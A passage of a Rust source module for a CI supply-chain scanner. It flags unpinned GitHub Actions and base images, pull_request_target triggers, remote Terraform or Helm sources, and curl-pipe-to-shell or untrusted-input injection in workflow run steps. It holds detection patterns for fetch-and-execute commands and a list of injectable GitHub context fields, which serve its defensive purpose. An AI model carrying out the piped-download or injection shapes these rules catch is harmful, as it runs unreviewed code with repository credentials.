//! CI / repo supply-chain scan rules — file-content detection for GitHub
//! Actions workflows, Dockerfiles, Terraform configs, Helm chart files, and
//! `package.json` lifecycle scripts. Only dangerous shapes fire; pinned/local
//! configs stay clean.
//!
//! Runs only on the `tirith scan` FileScan path (never the exec hot path), so
//! a tier-1 PATTERN_TABLE entry is not required for reachability — `tier1_scan`
//! always returns `true` for FileScan.
//!
//! The Terraform-module and Helm-chart-repo checks reuse the `install.rs`
//! command-line `RuleId`s: a remote module/chart is the same risk class whether
//! named on a command line or declared in a checked-in file.
//!
//! Detection is pure pattern matching — no network. Every function is total: a
//! malformed file yields no findings, never a panic.

use std::path::Path;

use crate::redact;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Classification of a repository file `cifile` rules understand.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CiFileKind {
    /// A GitHub Actions workflow (`.github/workflows/*.yml` / `*.yaml`).
    GithubWorkflow,
    /// A Dockerfile (`Dockerfile`, `Dockerfile.*`, `*.dockerfile`).
    Dockerfile,
    /// A Terraform / OpenTofu config (`*.tf`).
    Terraform,
    /// A Helm chart file (`Chart.yaml`, or a `requirements.yaml` next to one).
    HelmChart,
    /// An npm `package.json`.
    PackageJson,
}

/// Classify a file path as a CI/repo file `cifile` rules should scan, by
/// basename / extension / path shape only (content is never read). A workflow
/// is recognised only inside a `.github/workflows/` directory so a stray
/// `ci.yml` elsewhere is not misclassified. `None` keeps the scan narrow.
pub fn classify(path: Option<&Path>) -> Option<CiFileKind> {
    let path = path?;
    let basename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    let lower = basename.to_ascii_lowercase();

    if lower == "package.json" {
        return Some(CiFileKind::PackageJson);
    }

    // `Dockerfile`, `Dockerfile.prod`, `prod.dockerfile`.
    if lower == "dockerfile" || lower.starts_with("dockerfile.") || lower.ends_with(".dockerfile") {
        return Some(CiFileKind::Dockerfile);
    }

    // `*.tf` only — not `*.tfvars` (values, not module sources).
    if lower.ends_with(".tf") {
        return Some(CiFileKind::Terraform);
    }

    // `Chart.yaml` / `Chart.yml`, or the legacy Helm-2 `requirements.yaml`.
    if lower == "chart.yaml" || lower == "chart.yml" || lower == "requirements.yaml" {
        return Some(CiFileKind::HelmChart);
    }

    // A `.yml`/`.yaml` whose parent dir is `workflows` and grandparent `.github`.
    if lower.ends_with(".yml") || lower.ends_with(".yaml") {
        if let Some(parent) = path.parent() {
            let parent_name = parent
                .file_name()
                .and_then(|n| n.to_str())
                .map(str::to_ascii_lowercase)
                .unwrap_or_default();
            if parent_name == "workflows" {
                let grandparent_ok = parent
                    .parent()
                    .and_then(|gp| gp.file_name())
                    .and_then(|n| n.to_str())
                    .map(|n| n.eq_ignore_ascii_case(".github"))
                    .unwrap_or(false);
                if grandparent_ok {
                    return Some(CiFileKind::GithubWorkflow);
                }
            }
        }
    }

    None
}

/// `true` when `path` is a CI/repo file `cifile` rules scan. A thin wrapper
/// over [`classify`] for the engine's dispatch check.
pub fn is_ci_file(path: Option<&Path>) -> bool {
    classify(path).is_some()
}

/// Run the CI/repo supply-chain rules over a file's content.
///
/// `file_path` selects which checks apply (see [`classify`]); a file that is
/// not a recognised CI/repo file produces no findings.
pub fn check(input: &str, file_path: Option<&Path>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(kind) = classify(file_path) else {
        return findings;
    };

    match kind {
        CiFileKind::GithubWorkflow => check_workflow(input, &mut findings),
        CiFileKind::Dockerfile => check_dockerfile(input, &mut findings),
        CiFileKind::Terraform => check_terraform(input, &mut findings),
        CiFileKind::HelmChart => check_helm_chart(input, &mut findings),
        CiFileKind::PackageJson => check_package_json(input, &mut findings),
    }

    findings
}

// shared helpers

/// Truncate `s` to at most `max` chars (char-boundary safe), appending `…`
/// when truncation happened. Keeps evidence lines short.
fn truncate(s: &str, max: usize) -> String {
    let s = s.trim();
    if s.chars().count() <= max {
        return s.to_string();
    }
    let cut: String = s.chars().take(max).collect();
    format!("{cut}…")
}

/// Strip a single matching layer of surrounding quotes (single or double).
fn strip_quotes(s: &str) -> &str {
    let t = s.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        &t[1..t.len() - 1]
    } else {
        t
    }
}

/// `true` when `r` is an immutable 40-character lowercase-hex commit SHA — the
/// only form of action pin that cannot change under you. A short SHA, a tag,
/// or a branch name is *not* immutable.
fn is_commit_sha(r: &str) -> bool {
    r.len() == 40 && r.bytes().all(|b| b.is_ascii_hexdigit())
}

// GitHub Actions workflow checks

/// Run every workflow check over a workflow file's text.
fn check_workflow(input: &str, findings: &mut Vec<Finding>) {
    check_workflow_unpinned_actions(input, findings);
    check_workflow_dangerous_trigger(input, findings);
    check_workflow_run_steps(input, findings);
}

/// A GitHub Actions `uses:` reference. Only the third-party-action form
/// (`owner/repo[/path]@ref`) is a pin target — a local action (`./.github/…`)
/// and a Docker action (`docker://…`) are handled separately.
struct UsesRef<'a> {
    /// The whole reference value as written (`owner/repo@ref`).
    raw: &'a str,
    /// The `owner/repo[/path]` portion.
    repo: &'a str,
    /// The `@`-suffixed ref (branch / tag / SHA), without the `@`.
    git_ref: &'a str,
}

/// Parse a `uses:` value into a [`UsesRef`] when it is a pinnable third-party
/// action reference. Returns `None` for a local (`./…`) action, a
/// `docker://` action, or a value with no `@ref`.
fn parse_uses(value: &str) -> Option<UsesRef<'_>> {
    let v = strip_quotes(value).trim();
    if v.is_empty() {
        return None;
    }
    // A local `./` action is checked out with the repo — not a pin target.
    if v.starts_with("./") || v.starts_with("../") {
        return None;
    }
    // A `docker://image` action is image pinning — the Dockerfile rule's concern.
    if v.starts_with("docker://") {
        return None;
    }
    // The pin follows the LAST `@` (an owner/repo never contains `@`).
    let (repo, git_ref) = v.rsplit_once('@')?;
    if repo.is_empty() || git_ref.is_empty() {
        return None;
    }
    // A real action repo is `owner/repo` (optionally `owner/repo/subpath`).
    if !repo.contains('/') {
        return None;
    }
    Some(UsesRef {
        raw: v,
        repo,
        git_ref,
    })
}

/// Scan every `uses:` line for a reference pinned to a mutable ref.
fn check_workflow_unpinned_actions(input: &str, findings: &mut Vec<Finding>) {
    let mut flagged = 0usize;

    for raw_line in input.lines() {
        let line = raw_line.trim();
        // A `uses:` key — tolerate a leading `- ` list marker.
        let after = line
            .strip_prefix("- uses:")
            .or_else(|| line.strip_prefix("uses:"))
            .or_else(|| line.strip_prefix("-uses:"));
        let Some(value) = after else {
            continue;
        };
        let value = match value.split_once(" #") {
            Some((before, _)) => before,
            None => value,
        };
        let Some(uses) = parse_uses(value) else {
            continue;
        };
        // A 40-hex commit SHA is the immutable pin — clean.
        if is_commit_sha(uses.git_ref) {
            continue;
        }
        flagged += 1;
        if flagged == 1 {
            let mutable_kind = if uses.git_ref.eq_ignore_ascii_case("main")
                || uses.git_ref.eq_ignore_ascii_case("master")
                || uses.git_ref.eq_ignore_ascii_case("develop")
            {
                "a branch"
            } else {
                "a tag/branch"
            };
            findings.push(Finding {
                rule_id: RuleId::WorkflowUnpinnedAction,
                severity: Severity::Medium,
                title: format!("GitHub Actions step pinned to a mutable ref: {}", uses.repo),
                description: format!(
                    "The workflow uses the action '{}' pinned to {mutable_kind} ('@{}') rather \
                     than an immutable commit SHA. A mutable ref lets the action's code change \
                     between runs — if that action or a tag it controls is compromised, the \
                     malicious code runs in your CI with repository credentials. Pin the action \
                     to a full 40-character commit SHA.",
                    uses.repo, uses.git_ref
                ),
                evidence: vec![Evidence::Text {
                    detail: format!("uses: {}", truncate(uses.raw, 160)),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // When more than one action is unpinned, fold the count into the first
    // finding's description so a workflow with 20 unpinned steps yields one
    // clear finding, not 20.
    if flagged > 1 {
        if let Some(f) = findings
            .iter_mut()
            .rev()
            .find(|f| f.rule_id == RuleId::WorkflowUnpinnedAction)
        {
            f.description.push_str(&format!(
                " ({flagged} action references in this workflow are pinned to mutable refs.)"
            ));
        }
    }
}

/// The `pull_request_target` trigger — flagged because it runs with a
/// read/write `GITHUB_TOKEN` and repository secrets in the context of a
/// fork's PR. Combined with a checkout of the PR head, it is a well-known
/// secret-exfiltration / code-execution vector.
fn check_workflow_dangerous_trigger(input: &str, findings: &mut Vec<Finding>) {
    for raw_line in input.lines() {
        let line = raw_line.trim();
        // Drop a trailing comment so a mention inside one does not match.
        let code = match line.split_once('#') {
            Some((before, _)) => before.trim(),
            None => line,
        };
        // `pull_request_target` is dangerous in any of its YAML trigger forms:
        //  * a block mapping key — `pull_request_target:` (under an `on:` map);
        //  * a block sequence item — `- pull_request_target`;
        //  * an inline `on:` value — the scalar `on: pull_request_target`, the
        //    flow sequence `on: [pull_request_target, push]`, or the flow
        //    mapping `on: {pull_request_target: …}`.
        let is_block_form = code == "pull_request_target:"
            || code == "- pull_request_target"
            || code == "-pull_request_target"
            || code.starts_with("pull_request_target:");
        let is_inline_on_form = code.strip_prefix("on:").is_some_and(|rest| {
            rest.trim()
                .trim_start_matches(['[', '{'])
                .trim_end_matches([']', '}'])
                .split(',')
                .any(|tok| {
                    let tok = tok.trim();
                    tok == "pull_request_target" || tok.starts_with("pull_request_target:")
                })
        });
        if !is_block_form && !is_inline_on_form {
            continue;
        }
        findings.push(Finding {
            rule_id: RuleId::WorkflowDangerousTrigger,
            severity: Severity::High,
            title: "Workflow uses the pull_request_target trigger".to_string(),
            description: "This workflow is triggered by `pull_request_target`, which runs with a \
                 read/write `GITHUB_TOKEN` and access to repository secrets — in the context of \
                 a pull request that can come from an untrusted fork. If the workflow then checks \
                 out and runs code from the PR head, an attacker's fork can execute arbitrary \
                 code with your repository's credentials. Use `pull_request` instead, or never \
                 check out / execute untrusted PR code in a `pull_request_target` workflow."
                .to_string(),
            evidence: vec![Evidence::Text {
                detail: "trigger: pull_request_target".to_string(),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
        return;
    }
}

/// Markers that identify an attacker-controllable GitHub Actions context
/// expression — the value comes from a fork's PR / issue and is not
/// sanitised. Interpolating any of these straight into a shell `run:` step is
/// the classic Actions script-injection sink.
const UNTRUSTED_CONTEXT_MARKERS: &[&str] = &[
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.commits",
    "github.event.head_commit.message",
    "github.event.head_commit.author.name",
    "github.event.head_commit.author.email",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.head_ref",
];

/// Whether a `${{ … }}` expression body references an untrusted context
/// value. Tolerates whitespace inside the braces.
fn expression_is_untrusted(expr_body: &str) -> bool {
    let normalized: String = expr_body
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect::<String>()
        .to_ascii_lowercase();
    UNTRUSTED_CONTEXT_MARKERS
        .iter()
        .any(|m| normalized.contains(m))
}

/// Extract every `${{ … }}` expression body from a line.
fn github_expressions(line: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut rest = line;
    while let Some(start) = rest.find("${{") {
        let after = &rest[start + 3..];
        if let Some(end) = after.find("}}") {
            out.push(&after[..end]);
            rest = &after[end + 2..];
        } else {
            break;
        }
    }
    out
}

/// A pipe-to-shell shape inside a `run:` step — a network fetch piped into a
/// shell interpreter. Conservative: requires both a fetch tool and a pipe into
/// a known shell so an ordinary `echo x | grep y` does not fire.
fn line_has_curl_pipe_shell(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    let has_fetch = lower.contains("curl ")
        || lower.contains("wget ")
        || lower.contains("curl\t")
        || lower.contains("wget\t");
    if !has_fetch {
        return false;
    }
    // A pipe followed (possibly after `sudo`/whitespace) by a shell name.
    let Some(pipe_pos) = lower.find('|') else {
        return false;
    };
    let after_pipe = lower[pipe_pos + 1..].trim_start();
    // Skip an optional `sudo ` / `env ` wrapper.
    let after_wrapper = after_pipe
        .strip_prefix("sudo ")
        .or_else(|| after_pipe.strip_prefix("env "))
        .unwrap_or(after_pipe)
        .trim_start();
    let first_word = after_wrapper
        .split([' ', '\t', ';', '&'])
        .next()
        .unwrap_or("");
    // Strip a leading path (`/bin/bash` → `bash`).
    let shell_word = first_word.rsplit('/').next().unwrap_or(first_word);
    matches!(
        shell_word,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "ash"
            | "python"
            | "python3"
            | "perl"
            | "ruby"
            | "node"
    )
}

/// Scan a workflow's `run:` steps for a pipe-to-shell and for untrusted-input
/// interpolation. A `run:` block in YAML can be a single line or a `|`/`>`
/// block scalar; this scans every physical line and only counts a line as a
/// shell-step line when it is plausibly inside a `run:` body (the `run:` key
/// itself, or an indented continuation line).
fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
    let mut in_run_block = false;
    // The column where the `run` *key* starts (content after a `- ` marker, not
    // the dash; `      - run: |` → 8). The body must be indented strictly
    // deeper; a sibling `env:` at the key column or shallower ends the block.
    let mut run_key_col = 0usize;
    let mut curl_pipe_evidence: Option<String> = None;
    let mut untrusted_evidence: Option<(String, String)> = None;

    for raw_line in input.lines() {
        let indent = raw_line.len() - raw_line.trim_start().len();
        let trimmed = raw_line.trim();

        // A `run:`-prefixed line indented *inside* an active block body is body
        // content (e.g. a command invoking a binary named `run`), not a new
        // step — treat it as a step start only when not in a block, or when it
        // sits at/above the run-key column. Without this guard such a body line
        // ends the scan early and a later `curl`-into-shell line goes undetected.
        let run_inline = trimmed
            .strip_prefix("- run:")
            .or_else(|| trimmed.strip_prefix("run:"))
            .or_else(|| trimmed.strip_prefix("-run:"))
            .filter(|_| !in_run_block || indent <= run_key_col);

        if let Some(inline) = run_inline {
            let inline = inline.trim();
            // For `- run: …` the `run` key sits two columns past the dash.
            let key_col = if trimmed.starts_with("- ") {
                indent + 2
            } else {
                indent
            };
            // Strip a trailing YAML comment before the indicator check:
            // `run: | # deploy step` is valid YAML; without this the line is
            // mistaken for single-line `run:` and the body is never scanned.
            let inline_code = match inline.find('#') {
                Some(pos) => inline[..pos].trim_end(),
                None => inline,
            };
            if is_yaml_block_scalar_header(inline_code) {
                in_run_block = true;
                run_key_col = key_col;
                continue;
            }
            // A single-line `run:` — scan just this line.
            scan_run_line(inline, &mut curl_pipe_evidence, &mut untrusted_evidence);
            in_run_block = false;
            continue;
        }

        if in_run_block {
            // The block ends at the first non-blank line indented at or below the
            // `run` key column (a sibling key like `env:`/`with:`/`name:` sits
            // there); blank lines stay inside the block.
            if !trimmed.is_empty() && indent <= run_key_col {
                in_run_block = false;
            } else if !trimmed.is_empty() {
                scan_run_line(trimmed, &mut curl_pipe_evidence, &mut untrusted_evidence);
            }
        }
    }

    if let Some(ev) = curl_pipe_evidence {
        findings.push(Finding {
            rule_id: RuleId::WorkflowCurlPipeShell,
            severity: Severity::High,
            title: "Workflow run step pipes a download into a shell".to_string(),
            description:
                "A `run:` step in this workflow fetches a script over the network and pipes it \
                 straight into a shell interpreter (`curl … | bash`). The fetched code is never \
                 reviewed or pinned, and it executes in CI with the workflow's credentials — a \
                 compromised or spoofed download server then runs arbitrary code in your \
                 pipeline. Download the script to a file, verify it (checksum / signature), and \
                 only then execute it."
                    .to_string(),
            evidence: vec![Evidence::CommandPattern {
                pattern: "run: curl | shell".to_string(),
                matched: redact::redact_shell_assignments(&ev),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }

    if let Some((expr, line)) = untrusted_evidence {
        findings.push(Finding {
            rule_id: RuleId::WorkflowUntrustedInput,
            severity: Severity::High,
            title: "Untrusted input interpolated into a workflow run step".to_string(),
            description: format!(
                "A `run:` step interpolates the attacker-controllable expression `${{{{ {expr} \
                 }}}}` directly into a shell command. The value (a PR title, issue body, branch \
                 name, …) comes from an untrusted contributor — a crafted value is then run by \
                 the runner's shell. Pass the value through an intermediate `env:` variable and \
                 reference it as a quoted shell variable (`\"$TITLE\"`) instead of interpolating \
                 it into the script text."
            ),
            evidence: vec![Evidence::Text {
                detail: format!("run step: {}", truncate(&line, 160)),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
}

/// Return true if `code` is a YAML block-scalar header — the indicator (`|` /
/// `>`) optionally followed by a chomping indicator (`-`/`+`) and/or an
/// indentation digit (`1`–`9`), in either order, per YAML 1.2 §8.1.1.1.
///
/// PR #121 fix-list item 13: the pre-fix check accepted only `|`/`>`/`|-`/`|+`/
/// `>-`/`>+`, so `run: |2` was treated as single-line `run:`, the body never
/// entered block-scan mode, and a `curl | sh` / injection inside it went undetected.
fn is_yaml_block_scalar_header(code: &str) -> bool {
    let mut chars = code.chars();
    if !matches!(chars.next(), Some('|') | Some('>')) {
        return false;
    }

    // Optional chomp (`-`/`+`) and optional digit (`1`–`9`), zero or one each;
    // anything else (a second `|`, a quote, text) disqualifies the line.
    let mut saw_chomp = false;
    let mut saw_indent = false;
    for c in chars {
        match c {
            '-' | '+' if !saw_chomp => saw_chomp = true,
            '1'..='9' if !saw_indent => saw_indent = true,
            _ => return false,
        }
    }
    true
}

/// Scan one physical line of a `run:` body, recording the first pipe-to-shell
/// and the first untrusted-input interpolation seen.
fn scan_run_line(
    line: &str,
    curl_pipe: &mut Option<String>,
    untrusted: &mut Option<(String, String)>,
) {
    if curl_pipe.is_none() && line_has_curl_pipe_shell(line) {
        *curl_pipe = Some(truncate(line, 200));
    }
    if untrusted.is_none() {
        for expr in github_expressions(line) {
            if expression_is_untrusted(expr) {
                *untrusted = Some((expr.trim().to_string(), truncate(line, 200)));
                break;
            }
        }
    }
}

// Dockerfile checks

/// Scan a Dockerfile for a `FROM` on a mutable / un-pinned base image.
fn check_dockerfile(input: &str, findings: &mut Vec<Finding>) {
    // Build-stage names declared via `FROM … AS <name>`; a later
    // `FROM <name>` referring to one of these is an internal stage reference,
    // not an external image, and must not fire.
    let mut stage_names: Vec<String> = Vec::new();
    let mut flagged: Option<(String, String)> = None;
    let mut flagged_count = 0usize;

    for raw_line in input.lines() {
        let line = raw_line.trim();
        // Drop a trailing `# comment`.
        let code = match line.split_once('#') {
            Some((before, _)) => before.trim(),
            None => line,
        };
        // `FROM` is case-insensitive in Dockerfiles.
        let Some(rest) = strip_keyword_ci(code, "from") else {
            continue;
        };
        let mut tokens = rest.split_whitespace();
        let Some(image) = tokens.next() else {
            continue;
        };
        // Record an `AS <stage>` alias for this FROM.
        let mut stage_alias: Option<String> = None;
        let toks: Vec<&str> = tokens.collect();
        if let Some(as_idx) = toks.iter().position(|t| t.eq_ignore_ascii_case("as")) {
            if let Some(name) = toks.get(as_idx + 1) {
                stage_alias = Some(name.to_ascii_lowercase());
            }
        }

        let image_lower = image.to_ascii_lowercase();

        // A reference to an earlier build stage is internal — never flagged.
        let is_stage_ref = stage_names.contains(&image_lower);
        // A build-arg-templated image (`FROM ${BASE}`) can't be resolved — skip.
        let is_templated = image.contains('$');

        if !is_stage_ref && !is_templated {
            if let Some(reason) = unpinned_image_reason(image) {
                flagged_count += 1;
                if flagged.is_none() {
                    flagged = Some((image.to_string(), reason));
                }
            }
        }

        if let Some(alias) = stage_alias {
            stage_names.push(alias);
        }
    }

    if let Some((image, reason)) = flagged {
        let mut description = format!(
            "A Dockerfile `FROM` instruction uses the base image '{image}', which is {reason}. \
             A mutable tag is re-resolved on every build, so the image contents — and any \
             vulnerabilities or tampering in them — can change without any change to the \
             Dockerfile. Pin the base image to an immutable digest \
             (`FROM image:tag@sha256:<digest>`)."
        );
        if flagged_count > 1 {
            description.push_str(&format!(
                " ({flagged_count} FROM instructions in this Dockerfile use an un-pinned image.)"
            ));
        }
        findings.push(Finding {
            rule_id: RuleId::DockerfileUnpinnedImage,
            severity: Severity::Medium,
            title: format!("Dockerfile base image is not digest-pinned: {image}"),
            description,
            evidence: vec![Evidence::Text {
                detail: format!("FROM {}", truncate(&image, 160)),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
}

/// If `image` is a mutable / un-pinned base-image reference, return a reason;
/// otherwise `None`. An `@sha256:<digest>` is immutable (pinned). Only the
/// clear cases are flagged — `:latest` and no-tag; a specific version tag
/// without a digest is mutable but a much weaker signal, so it is not flagged.
fn unpinned_image_reason(image: &str) -> Option<String> {
    // A digest pin (`name@sha256:…` / `name:tag@sha256:…`) is immutable.
    if let Some((_, after_at)) = image.split_once('@') {
        if after_at.contains(':') && !after_at.is_empty() {
            return None;
        }
    }

    // The tag-introducing `:` is the one AFTER the last `/`, so a registry port
    // (`registry:5000/img`) is not mistaken for a tag. Strip `@digest` first.
    let without_digest = image.split('@').next().unwrap_or(image);
    let last_segment = without_digest.rsplit('/').next().unwrap_or(without_digest);
    let tag = last_segment.rsplit_once(':').map(|(_, t)| t);

    match tag {
        // Explicit `:latest` — mutable.
        Some(t) if t.eq_ignore_ascii_case("latest") => {
            Some("pinned to the mutable `latest` tag with no digest".to_string())
        }
        // A specific version tag with no digest — weaker; not flagged.
        Some(_) => None,
        // No tag at all — Docker defaults to `:latest`, also mutable.
        None => Some("un-tagged, so Docker resolves it to the mutable `latest` tag".to_string()),
    }
}

/// If `code` begins with the Dockerfile keyword `keyword` (case-insensitive)
/// followed by whitespace, return the remainder; otherwise `None`.
fn strip_keyword_ci<'a>(code: &'a str, keyword: &str) -> Option<&'a str> {
    if code.len() < keyword.len() + 1 {
        return None;
    }
    // PR #121 fix-list item 4: byte-level prefix check, not `split_at`, which
    // panics when `keyword.len()` lands inside a multi-byte char (e.g. `modulé`).
    // `keyword` is ASCII, so a matching head guarantees a char boundary and the
    // `&code[keyword.len()..]` slice below is sound.
    let head_bytes = &code.as_bytes()[..keyword.len()];
    if !head_bytes.eq_ignore_ascii_case(keyword.as_bytes()) {
        return None;
    }
    let tail = &code[keyword.len()..];
    if tail.starts_with(|c: char| c.is_whitespace()) {
        Some(tail.trim_start())
    } else {
        None
    }
}

// Terraform checks

/// Scan a Terraform config for a `module` block whose `source` is a remote /
/// untrusted location.
///
/// HCL is not fully parsed — instead the scan tracks whether it is inside a
/// `module "<name>" {` block and inspects `source = "<value>"` lines within
/// it. A local path source (`./`, `../`, absolute) and the Terraform Registry
/// (`registry.terraform.io`, or a bare `ns/name/provider` shorthand) are
/// trusted; a git / http(s) / cloud-bucket source is flagged.
fn check_terraform(input: &str, findings: &mut Vec<Finding>) {
    let mut brace_depth = 0i32;
    // The brace depth at which the current `module` block opened, if any.
    let mut module_block_depth: Option<i32> = None;
    let mut flagged: Option<String> = None;
    let mut flagged_count = 0usize;

    for raw_line in input.lines() {
        let line = raw_line.trim();
        let code = strip_hcl_comment(line);
        let code = code.trim();
        if code.is_empty() {
            continue;
        }

        // A `module "<name>" {` block header (the `{` may be on this line).
        let opens_module = is_module_block_header(code);
        if opens_module {
            // Remember the open depth *before* inspecting this line so a
            // one-line module (`module "x" { source = "…" }`) is inspected here.
            module_block_depth = Some(brace_depth + 1);
        }

        if let Some(open_depth) = module_block_depth {
            if brace_depth + 1 >= open_depth {
                if let Some(source) = parse_hcl_source(code) {
                    if is_untrusted_tf_source(&source) {
                        flagged_count += 1;
                        if flagged.is_none() {
                            flagged = Some(source);
                        }
                    }
                }
            }
        }

        let (opens, closes) = count_structural_braces(code);
        brace_depth += opens - closes;
        if brace_depth < 0 {
            brace_depth = 0;
        }
        // The module block has closed once depth drops back below its opening.
        if let Some(d) = module_block_depth {
            if brace_depth < d {
                module_block_depth = None;
            }
        }
    }

    if let Some(source) = flagged {
        let mut description = format!(
            "A Terraform `module` block sources its module from '{source}', a remote / untrusted \
             location rather than a local path or the Terraform Registry. A remote module is \
             fetched and executed with your full cloud credentials on `terraform apply` and can \
             provision arbitrary infrastructure or read state — confirm the module source is \
             trusted and, where possible, pin it to an exact revision."
        );
        if flagged_count > 1 {
            description.push_str(&format!(
                " ({flagged_count} module blocks in this file use a remote source.)"
            ));
        }
        findings.push(Finding {
            // Reuses the install-rule RuleId (same risk class as a CLI module).
            rule_id: RuleId::TerraformRemoteModule,
            severity: Severity::Medium,
            title: "Terraform module sourced from an untrusted remote location".to_string(),
            description,
            evidence: vec![Evidence::Text {
                detail: format!("module source: {}", truncate(&source, 160)),
            }],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        });
    }
}

/// Strip a trailing `#` or `//` HCL comment from a line, ignoring a `#` or
/// `//` that sits inside a double-quoted string. This matters for a Terraform
/// `source = "git::https://…"` line: the `//` in `https://` is part of the
/// value, not a comment, and a naïve cut would truncate the source URL.
fn strip_hcl_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut in_string = false;
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => in_string = !in_string,
            b'#' if !in_string => return &line[..i],
            b'/' if !in_string && i + 1 < bytes.len() && bytes[i + 1] == b'/' => {
                return &line[..i];
            }
            _ => {}
        }
        i += 1;
    }
    line
}

/// Count the structural `{` and `}` braces in an HCL line, ignoring any brace
/// that sits inside a double-quoted string literal. A `source` value such as
/// `"git::https://example.com/m?ref={var}"` carries literal braces that are
/// part of the string, not block delimiters — counting them as block depth
/// skews the `module`-block tracking and the `source` line is then attributed
/// to the wrong (or no) block.
fn count_structural_braces(code: &str) -> (i32, i32) {
    let mut in_string = false;
    let mut opens = 0i32;
    let mut closes = 0i32;
    for b in code.bytes() {
        match b {
            b'"' => in_string = !in_string,
            b'{' if !in_string => opens += 1,
            b'}' if !in_string => closes += 1,
            _ => {}
        }
    }
    (opens, closes)
}

/// Whether `code` is a `module "<name>" {`-style block header.
fn is_module_block_header(code: &str) -> bool {
    // Accept `module "x" {`, `module "x"` (brace next line), `module x {`.
    let Some(rest) = strip_keyword_ci(code, "module") else {
        return false;
    };
    let rest = rest.trim();
    // The label is the next token — quoted or bare.
    !rest.is_empty()
}

/// Parse a `source = "<value>"` HCL assignment, returning the unquoted value.
/// The `source` token is matched anywhere in `code` (one-line blocks put it
/// after the brace), but only at an HCL token boundary and outside any
/// double-quoted string, so `data_source` / a quoted `source` is not matched.
fn parse_hcl_source(code: &str) -> Option<String> {
    const KEY: &str = "source";
    let bytes = code.as_bytes();
    let is_ident = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'-';

    let mut in_string = false;
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'"' {
            in_string = !in_string;
            i += 1;
            continue;
        }
        if in_string {
            i += 1;
            continue;
        }
        // A `source` token at an identifier boundary. PR #121 fix-list item 4:
        // match on `&[u8]`, not `code[i..]` — a continuation byte at `i` (e.g.
        // `modulé` in a `.tf` file) would panic a `&str` slice. `KEY` is ASCII,
        // so the byte match is equivalent and a matching head is a char boundary.
        let matches_key = bytes
            .get(i..i + KEY.len())
            .is_some_and(|b| b == KEY.as_bytes());
        if matches_key
            && (i == 0 || !is_ident(bytes[i - 1]))
            && bytes
                .get(i + KEY.len())
                .map(|b| !is_ident(*b))
                .unwrap_or(true)
        {
            // `&str` slicing is sound here (matching ASCII head ⇒ char boundary).
            let after = code[i + KEY.len()..].trim_start();
            if let Some(rest) = after.strip_prefix('=') {
                let value = rest.trim();
                // The value should be a double-quoted string literal.
                if value.len() >= 2 && value.starts_with('"') {
                    let inner = &value[1..];
                    if let Some(end) = inner.find('"') {
                        return Some(inner[..end].to_string());
                    }
                }
                return None;
            }
        }
        i += 1;
    }
    None
}

/// Whether a Terraform module `source` string is an untrusted *remote*
/// source. Mirrors the logic in `install.rs::is_untrusted_module_source` so a
/// `.tf`-file finding and a command-line finding agree.
fn is_untrusted_tf_source(source: &str) -> bool {
    let s = source.trim();
    if s.is_empty() {
        return false;
    }
    // Local filesystem paths.
    if s.starts_with("./") || s.starts_with("../") || s.starts_with('/') || s.starts_with('.') {
        return false;
    }
    let lower = s.to_ascii_lowercase();
    // The Terraform Registry (explicit host).
    if lower.starts_with("registry.terraform.io/") || lower.starts_with("app.terraform.io/") {
        return false;
    }
    // Registry shorthand: exactly three `/`-separated non-URL components
    // (`namespace/name/provider`), e.g. `hashicorp/consul/aws`.
    if !lower.contains("://")
        && !lower.contains('@')
        && lower.split('/').count() == 3
        && !lower.contains('.')
    {
        return false;
    }
    // Everything else — git::, http(s)://, github.com/…, S3/GCS buckets — is
    // a remote source worth confirming.
    true
}

// Helm chart checks

/// Recognised Helm chart-repository hosts. Mirrors `install.rs`'s
/// `TRUSTED_HELM_HOSTS` so a chart-file finding and a `helm` command-line
/// finding agree on what counts as trusted.
const TRUSTED_HELM_HOSTS: &[&str] = &[
    "charts.helm.sh",
    "kubernetes-charts.storage.googleapis.com",
    "charts.bitnami.com",
    "registry-1.docker.io",
    "ghcr.io",
    "quay.io",
    "k8s.gcr.io",
    "registry.k8s.io",
    "prometheus-community.github.io",
    "grafana.github.io",
    "charts.jetstack.io",
    "helm.elastic.co",
    "argoproj.github.io",
    "kubernetes.github.io",
];

/// Scan a Helm chart file (`Chart.yaml` / `requirements.yaml`) for a
/// dependency `repository:` pointing at an untrusted remote chart repo.
fn check_helm_chart(input: &str, findings: &mut Vec<Finding>) {
    let mut flagged: Option<String> = None;
    let mut flagged_count = 0usize;

    for raw_line in input.lines() {
        let line = raw_line.trim();
        let code = match line.split_once('#') {
            Some((before, _)) => before.trim(),
            None => line,
        };
        // A dependency repository entry — `repository: <url>` or
        // `- repository: <url>` inside a `dependencies:` list.
        let after = code
            .strip_prefix("- repository:")
            .or_else(|| code.strip_prefix("repository:"))
            .or_else(|| code.strip_prefix("-repository:"));
        let Some(value) = after else {
            continue;
        };
        let url = strip_quotes(value).trim();
        if url.is_empty() {
            continue;
        }
